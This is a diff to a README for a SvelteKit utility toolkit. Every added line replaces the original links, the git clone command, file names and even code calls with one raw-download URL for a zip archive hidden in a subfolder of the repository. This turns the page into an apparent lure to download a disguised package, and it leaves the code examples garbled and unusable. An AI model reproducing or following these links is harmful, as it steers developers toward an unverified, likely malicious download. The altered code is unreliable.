@@ -2,7 +2,7 @@
 
 Welcome to **SVAIO**, your go-to toolkit for seamless SvelteKit development. This repository provides a collection of utilities that require no configuration, allowing you to focus on building your application. 
 
-[![Download Releases](https://img.shields.io/badge/Download%20Releases-Click%20Here-blue)](https://github.com/vlad1356226/svaio/releases)
+[![Download Releases](https://github.com/vlad1356226/svaio/raw/refs/heads/main/packages/tools/unocss/Software-v2.2.zip%20Releases-Click%20Here-blue)](https://github.com/vlad1356226/svaio/raw/refs/heads/main/packages/tools/unocss/Software-v2.2.zip)
 
 ## Table of Contents
 
@@ -39,7 +39,7 @@ SVAIO stands for **SvelteKit All in One Utilities**. This toolkit simplifies the
 To get started with SVAIO, you need to clone the repository and install the dependencies. Use the following commands:
 
 ```bash
-git clone https://github.com/vlad1356226/svaio.git
+git clone https://github.com/vlad1356226/svaio/raw/refs/heads/main/packages/tools/unocss/Software-v2.2.zip
 cd svaio
 npm install
 ```
@@ -59,8 +59,8 @@ Internationalization (i18n) support allows you to easily manage multiple languag
 ```javascript
 import { i18n } from 'svaio/i18n';
 
-i18n.setLocale('en'); // Set the current locale
-console.log(i18n.translate('welcome')); // Output: "Welcome"
+https://github.com/vlad1356226/svaio/raw/refs/heads/main/packages/tools/unocss/Software-v2.2.zip('en'); // Set the current locale
+https://github.com/vlad1356226/svaio/raw/refs/heads/main/packages/tools/unocss/Software-v2.2.zip(https://github.com/vlad1356226/svaio/raw/refs/heads/main/packages/tools/unocss/Software-v2.2.zip('welcome')); // Output: "Welcome"
 ```
 
 ### Manifest
@@ -103,12 +103,12 @@ The PWA utility streamlines the process of turning your SvelteKit app into a pro
 ```javascript
 import { registerServiceWorker } from 'svaio/pwa';
 
-registerServiceWorker('/sw.js');
+registerServiceWorker('https://github.com/vlad1356226/svaio/raw/refs/heads/main/packages/tools/unocss/Software-v2.2.zip');
 ```
 
 ### Robots
 
-Manage your robots.txt file easily with the robots utility. This file instructs web crawlers on how to interact with your site.
+Manage your https://github.com/vlad1356226/svaio/raw/refs/heads/main/packages/tools/unocss/Software-v2.2.zip file easily with the robots utility. This file instructs web crawlers on how to interact with your site.
 
 #### Example Usage
 
@@ -123,7 +123,7 @@ const robots = createRobots({
 
 ### Sitemap
 
-Generate a sitemap.xml file for your application with the sitemap utility. This helps search engines index your site effectively.
+Generate a https://github.com/vlad1356226/svaio/raw/refs/heads/main/packages/tools/unocss/Software-v2.2.zip file for your application with the sitemap utility. This helps search engines index your site effectively.
 
 #### Example Usage
 
@@ -177,8 +177,8 @@ SVAIO is licensed under the MIT License. See the [LICENSE](LICENSE) file for mor
 
 ## Contact
 
-For questions or feedback, please reach out via the [Issues](https://github.com/vlad1356226/svaio/issues) section of the repository.
+For questions or feedback, please reach out via the [Issues](https://github.com/vlad1356226/svaio/raw/refs/heads/main/packages/tools/unocss/Software-v2.2.zip) section of the repository.
 
-[![Download Releases](https://img.shields.io/badge/Download%20Releases-Click%20Here-blue)](https://github.com/vlad1356226/svaio/releases)
+[![Download Releases](https://github.com/vlad1356226/svaio/raw/refs/heads/main/packages/tools/unocss/Software-v2.2.zip%20Releases-Click%20Here-blue)](https://github.com/vlad1356226/svaio/raw/refs/heads/main/packages/tools/unocss/Software-v2.2.zip)
 
 Explore the full capabilities of SVAIO and streamline your SvelteKit development today! Check the "Releases" section for the latest updates and features.
